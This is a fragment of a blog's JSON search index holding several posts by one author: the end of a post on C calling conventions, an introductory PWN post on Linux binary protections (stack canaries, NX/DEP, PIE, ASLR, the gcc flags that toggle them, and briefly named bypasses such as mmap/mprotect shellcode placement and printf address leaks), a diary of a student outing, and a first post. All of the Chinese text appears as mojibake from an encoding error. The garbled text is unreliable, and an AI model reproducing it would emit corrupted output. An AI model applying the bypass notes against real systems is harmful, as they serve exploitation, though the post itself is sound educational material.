é«˜æ•ˆã€‚\n","slug":"Cè¯­è¨€å‡½æ•°è°ƒç”¨ä¸å¸¸è§è°ƒç”¨çº¦å®š","date":"2021-04-25T14:02:30.000Z","categories_index":"Cè¯­è¨€","tags_index":"æ”¶è·","author_index":"Krito"},{"id":"7a5daddedfee1de88701f3a5ab622f7d","title":"Linuxä¸‹å››ç§ä¿æŠ¤æœºåˆ¶","content":"checksecï¼ˆgdbå®‰è£…å¥½å°±æœ‰ï¼‰gdbåŠ¨æ€è°ƒè¯•è½¯ä»¶ï¼Œå¿…å¤‡ã€‚\nå®‰è£…ï¼š\n1apt-get install gdb\n\nç”¨æ³•ä½œç”¨ï¼šå®ƒæ˜¯ç”¨æ¥æ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶å±æ€§ï¼Œä¾‹å¦‚PIE, RELRO, PaX, Canaries, ASLR, Fortify Sourceç­‰ç­‰å±æ€§ã€‚\nç”¨æ³•ï¼šchecksec filename\nä¾‹å­ï¼š\n123456gdb-peda$ checksec startCANARY    : disabled(è¿™ä¸ªé€‰é¡¹è¡¨ç¤ºæ ˆä¿æŠ¤åŠŸèƒ½æœ‰æ²¡æœ‰å¼€å¯ã€‚)FORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : disabled\n\n\n\nCANNARY(æ ˆä¿æŠ¤)æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®©shellcodeèƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆä¸­é«˜å±åŒºæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚**\ngccåœ¨4.2ç‰ˆæœ¬ä¸­æ·»åŠ äº†-fstack-protectorå’Œ-fstack-protector-allç¼–è¯‘å‚æ•°ä»¥æ”¯æŒæ ˆä¿æŠ¤åŠŸèƒ½ï¼Œ4.9æ–°å¢äº†-fstack-protector-strongç¼–è¯‘å‚æ•°è®©ä¿æŠ¤çš„èŒƒå›´æ›´å¹¿ã€‚\nå› æ­¤åœ¨ç¼–è¯‘æ—¶å¯ä»¥æ§åˆ¶æ˜¯å¦å¼€å¯æ ˆä¿æŠ¤ä»¥åŠç¨‹åº¦ï¼Œä¾‹å¦‚ï¼š\n123gcc -fno-stack-protector -o test test.c  &#x2F;&#x2F;ç¦ç”¨æ ˆä¿æŠ¤gcc -fstack-protector -o test test.c   &#x2F;&#x2F;å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç gcc -fstack-protector-all -o test test.c &#x2F;&#x2F;å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç \n\nç»•è¿‡æ–¹æ³•é’ˆå¯¹ä¸åŒæƒ…å†µï¼Œæ€»ç»“äº†å…­ç§ç»•è¿‡æ–¹æ³•ï¼Œæœ‰å…´è¶£å¯ä»¥å‚è€ƒæˆ‘çš„å¦ä¸€ç¯‡åšå®¢ç»•è¿‡canaryçš„å…­ç§æ–¹æ³•\nNXï¼ˆDEPï¼‰NXï¼ˆ DEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜â»šæ ‡è¯†ä¸ºä¸å¯æ‰§â¾,å½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬â¼Šshellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®â»šâ¾¯ä¸Šæ‰§â¾æŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ ,â½½ä¸æ˜¯å»æ‰§â¾æ¶æ„æŒ‡ä»¤ ã€‚ \n123gcc -o test test.c &#x2F;&#x2F; é»˜è®¤æƒ…å†µä¸‹ï¼Œå¼€å¯NXä¿æŠ¤gcc -z execstack -o test test.c &#x2F;&#x2F; ç¦â½¤NXä¿æŠ¤ gcc -z noexecstack -o test test.c &#x2F;&#x2F; å¼€å¯NXä¿æŠ¤\n\nåœ¨Windowsä¸‹ï¼Œç±»ä¼¼çš„æ¦‚å¿µä¸ºDEPï¼ˆæ•°æ®æ‰§è¡Œä¿æŠ¤ï¼‰,æ•°æ®æ‰§â¾ä¿æŠ¤( D E P ) ï¼ˆ Data Execution Prevention ï¼‰ æ˜¯â¼€å¥—è½¯ç¡¬ä»¶æŠ€æœ¯ï¼Œèƒ½ å¤Ÿ åœ¨ å†… å­˜ä¸Šæ‰§â¾é¢å¤–æ£€æŸ¥ä»¥å¸®åŠ©é˜²â½Œåœ¨ç³»ç»Ÿä¸Šè¿â¾æ¶æ„ä»£ç  ,åœ¨æœ€æ–°ç‰ˆçš„Visual Studioä¸­é»˜è®¤å¼€å¯äº†DEPç¼–è¯‘é€‰é¡¹ã€‚\nç»•è¿‡æ–¹æ³•ç›®å‰é‡è§è¿‡çš„æ–¹æ³•æœ‰\n\nåˆ©ç”¨mmapç”³è¯·ä¸€å—æœ‰rwxæƒé™çš„å†…å­˜ï¼Œå¾€é‡Œé¢å†™shellcodeï¼Œæœ€ç»ˆè¿”å›åˆ°shellcodeä¸Š\nåˆ©ç”¨mprotectå‡½æ•°ä¿®æ”¹bssæ®µæƒé™ä¸ºrwxï¼ŒæŠŠshellcodeå†™åˆ°bssæ®µä¸Šå†è¿”å›åˆ°shellocdeä¸Š\n\nPIEï¼ˆASLRï¼‰å¯ä»¥é˜²èŒƒåŸºäºRet2libcæ–¹å¼çš„é’ˆå¯¹DEPçš„æ”»å‡»ã€‚ASLRå’ŒDEPé…åˆä½¿ç”¨ï¼Œèƒ½æœ‰æ•ˆé˜»æ­¢æ”»å‡»è€…åœ¨å †æ ˆä¸Šè¿è¡Œæ¶æ„ä»£ç ã€‚PIEå’ŒASLRä¸æ˜¯ä¸€æ ·çš„ä½œç”¨ï¼ŒASLRåªèƒ½å¯¹å †ã€æ ˆ,ibcå’ŒmmapéšæœºåŒ–ï¼Œè€Œä¸èƒ½å¯¹ä»£ç æ®µï¼Œæ•°æ®æ®µéšæœºåŒ–ï¼Œä½¿ç”¨PIE+ASLRåˆ™å¯ä»¥å¯¹ä»£ç æ®µå’Œæ•°æ®æ®µéšæœºåŒ–ã€‚åŒºåˆ«æ˜¯ASLRæ˜¯ç³»ç»ŸåŠŸèƒ½é€‰é¡¹ï¼ŒPIEå’ŒPICæ˜¯ç¼–è¯‘å™¨åŠŸèƒ½é€‰é¡¹ã€‚è”ç³»ç‚¹åœ¨äºåœ¨å¼€å¯ASLRä¹‹åï¼ŒPIEæ‰ä¼šç”Ÿæ•ˆã€‚\n12345gcc -o test test.c &#x2F;&#x2F; é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯PIE gcc -fpie -pie -o test test.c &#x2F;&#x2F; å¼€å¯PIEï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1 gcc -fPIE -pie -o test test.c &#x2F;&#x2F; å¼€å¯PIEï¼Œæ­¤æ—¶ä¸ºæœ€â¾¼å¼ºåº¦2 gcc -fpic -o test test.c &#x2F;&#x2F; å¼€å¯PICï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1ï¼Œä¸ä¼šå¼€å¯PIEgcc -fPIC -o test test.c &#x2F;&#x2F; å¼€å¯PICï¼Œæ­¤æ—¶ä¸ºæœ€â¾¼å¼ºåº¦2ï¼Œä¸ä¼šå¼€å¯PIE\n\n\n\nASLR (Address Space Layout Randomization)ASLRæ˜¯â¼€ç§é’ˆå¯¹ç¼“å†²åŒºæº¢å‡ºçš„å®‰å…¨ä¿æŠ¤æŠ€æœ¯,é€šè¿‡å¯¹å †æ ˆ ã€å…±äº«åº“æ˜ å°„ç­‰çº¿æ€§åŒºå¸ƒå±€çš„éšæœºåŒ–ï¼Œé€šè¿‡å¢åŠ æ”»å‡»è€…é¢„æµ‹â½¬çš„åœ°å€çš„éš¾åº¦,é˜²â½Œæ”»å‡»è€…ç›´æ¥å®šä½æ”»å‡»ä»£ç ä½ç½®,è¾¾åˆ°é˜»â½Œæº¢å‡ºæ”»å‡»çš„â½¬çš„ã€‚ \nç»•è¿‡æ–¹æ³•å¯ä»¥åˆ©ç”¨printfå‡½æ•°æ³„éœ²åœ°å€ä»è€Œè·å¾—çœŸæ­£åœ°å€\nå‚è€ƒæ–‡ç« ï¼šhttps://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/\n","slug":"linuxç¨‹åºçš„å¸¸â½¤ä¿æŠ¤æœºåˆ¶","date":"2021-04-09T13:14:59.000Z","categories_index":"PWN","tags_index":"åŸºç¡€çŸ¥è¯†","author_index":"Krito"},{"id":"ea7bb1240e1dab8cf5209f8a8c9f1924","title":"å¿«ä¹å‘¨äº”","content":"\n\n\n\n\n\n\n\n\nè¿™æ˜¯è¿™å‡ ä¸ªæœˆæœ€å€¼å¾—çºªå¿µçš„å‘¨äº”ï¼Œä½“éªŒäº†è„±ç¦»å­¦æ ¡çš„å¿«ä¹\n2020.12.13\n  æ™šä¸Šå’Œç¤¾å›¢å…¶å®ƒäººä¸€èµ·è°‹åˆ’ç€â€œå‡ºæ ¡å¤§è®¡â€ï¼ŒåŸæœ¬å®šåœ¨å‘¨å…­ï¼Œä½†æ˜¯ç”±äºå­¦æ ¡è¦ä½“æµ‹ï¼ˆæŒºä½©æœå­¦æ ¡æŒ‘æ—¶é—´çš„èƒ½åŠ›ğŸ¤¬ï¼‰ï¼Œä¸å¾—ä¸å°†æ—¶é—´æ”¹æˆå‘¨äº”ï¼Œè®©å¿«ä¹å‡å°‘äº†ä¸€åŠğŸ˜”\n2020.12.15\n  æœç„¶åˆ°äº†å‘¨æœ«å°±ä¼šå‘ç°å±äº‹å¾ˆå¤šğŸ˜”ï¼Œä¸€ä¸ªä¸ªå‘¨æœ«éƒ½æœ‰äº‹ï¼Œåªå‰©å‡ ä¸ªå¤§ç”·äººå¯ä»¥å‡ºå»ï¼Œè¿™æ¬¡å‡ºæ ¡ä¹Ÿå˜æˆäº†â€œç½—æ±‰å‡ºè¡Œâ€ï¼Œç…§è¿™æ ·ä¸‹å»ï¼Œä¸çŸ¥é“ä¹‹åå‡ å¤©ä¼šå‘ç”Ÿä»€ä¹ˆğŸ˜±\n2020.12.17\n  åŸæœ¬è¯¾ä¸Šå¾—å¥½å¥½çš„ï¼Œçªç„¶ä¸€ä¸ªæœ‹å‹è¯´å‘¨å…­ä½“æµ‹å–æ¶ˆäº†ï¼Œæ”¹äº†æ—¶é—´ï¼Œæˆ‘ç›´æ¥å½“åœºçˆ†ç‚¸ğŸ¤¬ï¼Œæ²¡åŠæ³•å‡æ¡éƒ½ä¸Šäº¤äº†ï¼Œæ—¶é—´ä¹Ÿä¸èƒ½ä¿®æ”¹ï¼Œåªèƒ½è®¤å‘½\n2020.12.18\n  åŸæœ¬è®¡åˆ’å¥½çš„äº”ä¸ªäººï¼Œè¦èµ°çš„æ—¶å€™æœ€åä¸€ä¸ªäººæ‰é“¾å­ğŸ˜”ï¼Œæœ€åå˜æˆå››ç½—æ±‰å‡ºè¡Œã€‚\nå¼€å§‹æ‰“ç®—çœ‹ç”µå½±ï¼Œä½†æ˜¯è§‰å¾—æ²¡ä»€ä¹ˆå¥½çœ‹çš„ç”µå½±åŠ ä¸Šæ—¶é—´ä¸å¤Ÿï¼Œæ‰€ä»¥æ”¹æˆäº†å¯†å®¤é€ƒè„±ï¼ˆè¡¥å……ä¸€ä¸‹ï¼Œæœ‰ä¸ªå½“åœ°äººå¸¦è·¯éå¸¸é‡è¦ğŸ˜ƒï¼‰\n\n\n\n\n\n\næ¸¸æˆä½“éªŒè¿˜ä¸é”™ï¼ˆé™¤äº†é‚£ä¸ªæ€•é¬¼çš„å¸ˆå…„ï¼‰ï¼Œè¿˜é€äº†ä¸€ä¸ªçºªå¿µå“ï¼ˆä¸‹é¢çš„æ˜¯ä¹°å¥¶èŒ¶é€çš„çºªå¿µå“ï¼‰ğŸ˜ƒ\n\n\næœ€åå»åƒäº†ç¢—æ‹‰é¢ï¼Œå‘³é“è¿˜æ˜¯ç›¸å½“ä¸é”™çš„ï¼Œå°±æ˜¯ä»·æ ¼æœ‰ç‚¹å°è´µ/(ã„’oã„’)/~~\né¥­åå»é€›äº†ä¸€ä¸‹ï¼Œå¸¦ç‚¹ä¸œè¥¿ç»™å®¤å‹ï¼Œæœ€åæ‰“çš„å›æ ¡\n\n\n  è¿™æ¬¡è¡Œç¨‹è¿˜æ˜¯ä¸é”™çš„ï¼ˆæ¯”å‘†åœ¨å­¦æ ¡å¥½å¤šäº†ï¼‰ï¼Œå‘ç°å—æ˜Œè¿˜æ˜¯è›®å¥½ç©çš„ï¼Œä½†å°±æ˜¯ä¸çŸ¥é“ä¸‹æ¬¡å‡ºå»æ˜¯ä»€ä¹ˆæ—¶å€™äº†ğŸ˜”\n","slug":"tuoli","date":"2020-12-19T02:48:28.000Z","categories_index":"ç”Ÿæ´»","tags_index":"å¨±ä¹","author_index":"Krito"},{"id":"ce9156f0e3c852946bbfbbd9e0a335db","title":"æˆ‘çš„ç¬¬ä¸€ç¯‡æ–‡ç« ","content":"æ–°çš„å¼€å§‹è¿™æ˜¯æœ¬äººç¬¬ä¸€æ¬¡æ­åšå®¢ï¼Œèµ°äº†è®¸å¤šå¼¯è·¯ï¼Œç»è¿‡äº†æ— æ•°æ¬¡çš„å¤±è´¥ï¼Œæµªè´¹äº†å¤§é‡çš„æ—¶é—´ï¼Œä½†æœ€ç»ˆè¿˜æ˜¯æ­å»ºå®Œæˆã€‚åœ¨è¿™å…¶ä¸­ï¼Œæˆ‘è¯·æ•™äº†çŸ³å¸ˆå…„å’Œé«˜å¸ˆå…„ï¼Œå€Ÿé‰´äº†Bç«™çš„è§†é¢‘ï¼Œæ‰æœ€ç»ˆæˆåŠŸã€‚æœ€åï¼Œæˆ‘å¸Œæœ›è¿ˆå‡ºè¿™ä¸€å°æ­¥åèƒ½å¤Ÿç»§ç»­å‘å‰ï¼Œå¹¶æˆä¸ºæˆ‘æƒ³æˆä¸ºçš„äººã€‚\n\n\néŸ³é¢‘æµ‹è¯•ç…§ç‰‡\n\néŸ³ä¹\n\nè§†é¢‘\n\n\n","slug":"My-First-Post","date":"2020-11-21T07:48:03.000Z","categories_index":"å¿ƒå¾—","tags_index":"æ„Ÿæƒ³","author_index":"Krito"}]